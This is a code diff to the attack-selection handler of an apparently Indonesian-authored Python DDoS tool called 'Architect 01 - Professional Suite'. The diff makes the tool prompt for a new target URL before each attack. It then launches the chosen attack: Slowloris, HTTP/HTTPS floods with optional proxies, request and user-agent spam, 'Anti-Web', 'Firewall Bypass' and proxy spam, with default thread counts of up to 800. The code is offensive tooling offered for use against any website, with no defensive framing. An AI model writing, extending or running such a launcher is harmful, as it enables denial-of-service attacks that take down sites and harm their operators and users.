@@ -4,6 +4,7 @@
 """
 Main Handler for Attack Selection
 Architect 01 - Professional Suite
+FIX: Input URL setiap kali milih attack
 """
 
 import os
@@ -29,7 +30,6 @@ class AttackHandler:
     """Handle attack selection and execution"""
     
     def __init__(self):
-        self.target_url = None
         self.version = "2.0"
         
     def clear_screen(self):
@@ -98,60 +98,72 @@ class AttackHandler:
             return default
     
     def run_attack(self, attack_type):
-        """Run selected attack"""
+        """Run selected attack - INPUT URL BARU SETIAP KALI"""
+        
+        # Attack type 5 gak perlu URL
         if attack_type == '5':
             check_real_ip()
             return
         
-        if not self.target_url:
-            self.target_url = get_target_url()
+        # Selain type 5, minta URL BARU
+        print(f"{Fore.CYAN}\n╭─❯ Target URL required for this attack{Style.RESET_ALL}")
+        target_url = get_target_url()
         
+        # Get thread count
         thread_defaults = {
-            '1': 300,
-            '2': 200,
-            '3': 800,
-            '4': 500,
-            '6': 200,
-            '7': 300,
-            '8': 150,
-            '9': 200,
+            '1': 300,   # Slowloris
+            '2': 200,   # Attack Via Link
+            '3': 800,   # Spam Request
+            '4': 500,   # Flood HTTP/HTTPS
+            '6': 200,   # Anti-Web
+            '7': 300,   # UserAgent Spam
+            '8': 150,   # Firewall Bypass
+            '9': 200,   # Proxy Spam
         }
         
         default = thread_defaults.get(attack_type, 500)
         threads = self.get_thread_count(default)
         
+        # Execute attack based on type
         if attack_type == '1':
-            attack = SlowlorisAttack(self.target_url, threads)
+            print(f"{Fore.GREEN}╰─❯ Starting Slowloris Attack...{Style.RESET_ALL}")
+            attack = SlowlorisAttack(target_url, threads)
             attack.start()
             
         elif attack_type == '2':
-            print(f"{Fore.YELLOW}╰─❯ Attack Via Link selected - using HTTP Flood{Style.RESET_ALL}")
-            attack = HTTPFlood(self.target_url, threads, use_proxy=False)
+            print(f"{Fore.GREEN}╰─❯ Attack Via Link selected - using HTTP Flood{Style.RESET_ALL}")
+            attack = HTTPFlood(target_url, threads, use_proxy=False)
             attack.start()
             
         elif attack_type == '3':
-            attack = RequestSpammer(self.target_url, threads)
+            print(f"{Fore.GREEN}╰─❯ Starting Request Spam...{Style.RESET_ALL}")
+            attack = RequestSpammer(target_url, threads)
             attack.start()
             
         elif attack_type == '4':
             use_proxy = input(f"{Fore.CYAN}╰─❯ Use proxy? (y/n): {Style.RESET_ALL}").lower() == 'y'
-            attack = HTTPFlood(self.target_url, threads, use_proxy)
+            print(f"{Fore.GREEN}╰─❯ Starting HTTP/HTTPS Flood...{Style.RESET_ALL}")
+            attack = HTTPFlood(target_url, threads, use_proxy)
             attack.start()
             
         elif attack_type == '6':
-            attack = AntiWebAttack(self.target_url, threads)
+            print(f"{Fore.GREEN}╰─❯ Starting Anti-Web Attack...{Style.RESET_ALL}")
+            attack = AntiWebAttack(target_url, threads)
             attack.start()
             
         elif attack_type == '7':
-            attack = UserAgentSpam(self.target_url, threads)
+            print(f"{Fore.GREEN}╰─❯ Starting UserAgent Spam...{Style.RESET_ALL}")
+            attack = UserAgentSpam(target_url, threads)
             attack.start()
             
         elif attack_type == '8':
-            attack = FirewallBypass(self.target_url, threads)
+            print(f"{Fore.GREEN}╰─❯ Starting Firewall Bypass...{Style.RESET_ALL}")
+            attack = FirewallBypass(target_url, threads)
             attack.start()
             
         elif attack_type == '9':
-            attack = ProxySpam(self.target_url, threads)
+            print(f"{Fore.GREEN}╰─❯ Starting Proxy Spam...{Style.RESET_ALL}")
+            attack = ProxySpam(target_url, threads)
             attack.start()
     
     def main_loop(self):
